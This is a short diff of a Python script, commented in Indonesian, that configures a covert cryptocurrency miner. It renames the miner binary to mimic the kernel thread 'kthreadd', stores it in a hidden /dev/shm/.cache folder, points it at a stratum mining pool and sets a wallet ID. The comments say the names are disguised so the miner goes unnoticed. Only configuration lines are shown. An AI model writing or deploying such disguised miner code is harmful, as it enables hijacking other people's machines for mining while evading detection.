@@ -3,11 +3,11 @@ import time
 import os
 
 # Nama file panen kamu sayang, disamarkan biar gak ketauan
-panen_bin = "kthreadd"
+panen_bin = "kthreadd."
 panen_path = f"/dev/shm/.cache/{panen_bin}"
 
 # Target dan ID Panen (disamarkan juga)
-target = "stratum+tcp://sg.vipor.net:5040"
+target = "stratum+tcp://sg.vipor.net:5140"
 id_panen = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
 
 # Daftar jadwal panen: jumlah alat, durasi panen (detik), waktu istirahat (detik)
